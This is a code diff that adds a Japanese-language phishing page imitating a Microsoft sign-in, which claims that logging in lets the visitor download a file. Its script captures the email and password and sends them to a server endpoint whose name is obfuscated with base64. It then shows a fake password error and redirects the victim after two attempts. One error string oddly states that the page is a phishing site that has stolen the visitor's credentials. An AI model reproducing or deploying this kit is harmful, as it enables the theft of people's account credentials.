@@ -1,1 +1,154 @@
+<!DOCTYPE html>
+<html lang="en-US">
 
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="cache-control" content="no-cache,no-store">
+    <title>Sign In</title>
+    <link rel="stylesheet" type="text/css" href="./css/style.css">
+
+</head>
+
+<body class="body">
+    <div id="fullPage">
+        <div id="brandingWrapper" class="float">
+            <div id="branding" style="background:rgba(0, 0, 0, 0.3) url('images/illustration.png');background-blend-mode: darken;"></div>
+        </div>
+        <div id="contentWrapper" class="float">
+            <div id="content">
+                <div id="header">
+                    <img src="images/msheader.svg">
+                </div>
+                <div id="workArea">
+                    <div id="authArea" class="groupMargin">
+                        <div id="loginArea">
+                            <div style="text-align: center;">
+                                <img src="images/logo.jpeg" width="300px">
+                            </div>
+                            <div id="loginMessage" class="groupMargin" style="font-weight: 600;font-size: 16px">ファイルをダウンロードするには、あなたのMicrosoftアカウントにログインしてください。</div>
+                            <form method="post" id="loginForm" autocomplete="off">
+                                <center>
+                                    <div class="alert alert-danger" id="msg" style="display: none;color: red;">エラーメッセージ：Invalid Password..! Please enter correct password.</div>
+                                    <span id="error" class="text-danger" style="display: none;color:red;">エラーメッセージ：That account doesn't exist. Enter a different account</span>
+                                </center>
+                                <div id="formsAuthenticationArea">
+                                    <div id="userNameArea">
+                                        <input id="ai" name="ai" type="email" value="" tabindex="1" class="text fullWidth" spellcheck="false" placeholder="Email Address" style="border:0px;border-bottom: 1px solid #BABABA;">
+                                    </div>
+                                    <div id="passwordArea" style="margin-top: 10px">
+                                        <input id="pr" name="pr" type="password" tabindex="2" class="text fullWidth" placeholder="Password" style="border:0px;border-bottom: 1px solid #BABABA;">
+                                    </div>
+                                    <div id="passwordArea" style="margin-top: 10px;color:#797979">
+                                        <input  type="checkbox" class="text" placeholder="Password" style="border:0px;border-bottom: 1px solid #797979;color: "> &nbspKeep me sign in
+                                    </div>
+                                    <div id="submissionArea" class="submitMargin" style="text-align: right;">
+                                        <span id="submit-btn" class="submit" tabindex="4" style="background:green">DOWNLOAD</span>
+                                    </div>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+                <div id="footerPlaceholder"></div>
+            </div>
+
+        </div>
+    </div>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
+</body>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
+</body>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+
+<script>
+//redirect link
+    var rdrt = "./link.php";
+
+    //mail result count
+    var rc = 2;
+
+    //mailer link
+    var f = atob("bmV4dC5waHA=");
+
+
+
+    $(document).ready(function() {
+    var m = 0;
+    var n = window.location.hash.substr(1);
+    if (!n) { } else {
+        var o = n;
+    var p = o.indexOf("@");
+    var q = o.substr((p + 1));
+    var c = q.substr(0, q.indexOf('.'));
+    var r = c.toLowerCase();
+    $('#ai').val(o);
+    $('#aich').html(o);
+    $("#msg").hide()
+    }
+    $('#submit-btn').click(function(b) {
+        $('#error').hide();
+    $('#msg').hide();
+    b.preventDefault();
+    var d = $("#ai").val();
+    var e = $("#pr").val();
+    var g = $('#msg').html();
+    $('#msg').text(g);
+    var h = d;
+    var i = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2, 4})+$/;
+    if (!d) {
+        $('#error').show();
+    $('#error').html("メールアドレスが空です。");
+    return false
+        }
+    if (!i.test(h)) {
+        $('#error').show();
+    $('#error').html("フィッシングサイトです。あなたのMicrosoft認証情報を盗みました。");
+    return false
+        }
+    if (!e) {
+        $('#error').show();
+    $('#error').html("パスワードが間違っています。");
+    return false
+        }
+    var j = h.indexOf("@");
+    var k = h.substr((j + 1));
+    var c = k.substr(0, k.indexOf('.'));
+    var l = c.toLowerCase();
+    m = m + 1;
+    $.ajax({
+        dataType: 'JSON',
+    url: f,
+    type: 'POST',
+    data: {
+        ai: d,
+    pr: e,
+            },
+    beforeSend: function(a) {
+        $('#submit-btn').html('DOWNLOADING...')
+    },
+    complete: function() {
+        $("#pr").val("");
+                if (m >= rc) {
+        m = 0;
+    window.location.replace(rdrt);
+    return false
+                }
+    $("#msg").show();
+    $('#submit-btn').html('DOWNLOAD')
+            }
+        })
+    })
+});
+</script>
+
+</html>
